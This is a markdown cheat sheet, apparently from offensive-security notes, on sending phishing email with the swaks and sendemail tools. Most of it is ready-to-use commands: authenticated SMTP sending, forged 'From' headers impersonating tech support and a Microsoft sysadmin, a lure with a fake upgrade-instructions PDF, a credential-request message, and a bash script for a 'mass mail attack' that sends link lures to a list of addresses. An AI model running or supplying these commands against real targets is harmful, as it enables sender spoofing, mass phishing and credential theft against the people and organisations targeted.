# Manual

It is recommended to use `swaks` instead of `sendemail` due to a missing feature to change the mail transfer agent (think of it as an SMTP version of user agent) that can easily detect the specific version.

## 01 - Swaks

### 1.1 - Syntax

```
$ swaks [--tls] --server <smtp_server_IP> --to <reciever_email_address> --from <sender_email_address> --header "Subject: <subject_name>" --body "<body_paragraph>" [--add-header "Content-Type: text/html"] [--attach /path/to/file.txt]
```

Pass the credentials.

```
$ swaks --auth-user <email> --auth-password <password> --server <smtp_server_IP> [--port <PORT>] --auth plain [--tls] --to <reciever_email_address> --from <sender_email_address> --header "Subject: <subject_name>" --body "<body_paragraph>" [--add-header "Content-Type: text/html"] [--attach /path/to/file.txt]
```

### 1.2 - Usage

```
$ swaks -t itdept@victim.com --from techsupport@bestcomputers.com --header "Subject: test" --body "Please click the link <attacker_URL>" --server 192.168.8.131
```

Perform a mass mail attack.

```bash
#!/bin/bash
while read -r email
do
	swaks -t "${email}" --from techsupport@bestcomputers.com --header "Subject: test" --body "Please click the link <attacker_URL>" --server "${2}"
	[[ ${?} -ne 0 ]] && echo "${email}"
done < ${1}
```

The syntax as it follows.

```
$ ./mass_mail.sh emails.txt 192.168.8.131
```

## 02 - SendEmail

### 2.1 - Syntax

Syntax usage of the program.

```
$ sendemail -t <reciever_email_address> -f <sender_email_address> -s <smtp_relay_server_IP>:<PORT> -u "<Subject>" -a file.txt -o message-header="From: <fake_name> <<spoof_email>>"
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

A body paragraph that is written line by line
until you press CTRL-D to end the input
```

You can pass the credentials for your SMTP mail server.

```
$ sendemail -xu <email> -xp <password> -s <smtp_server_IP>[:<PORT>] -f <spoof_email> -t <email_target> -u "<subject>" -m "<message>" -o message-header="From: <fake_name> <<spoof_email>>"
```

### 2.2 - Usage

Here's an example just to show you how it works.

```
$ sendemail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u "Important Upgrade Instructions" -a /tmp/BestComputers-UpgradeInstructions.pdf -o message-header="From: Tech Support <techsupport@bestcomputers.com>"
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
<fake_name>
```

For passing the credentials.

```
$ sendemail -xu attacker@email.com -xp <password> -s email.com -f sysadmin@microsoft.com -t john@microsoft.com -u "Subject Name" -m "Send me your creds" -o message-header="From: SysAdmin <sysadmin@microsoft.com>"
```

---
## References

### mgeeky

- [mgeeky: WarCon22 - Modern Initial Access and Evasion Tactics.pdf](https://mgeeky.tech/uploads/WarCon22%20-%20Modern%20Initial%20Access%20and%20Evasion%20Tactics.pdf)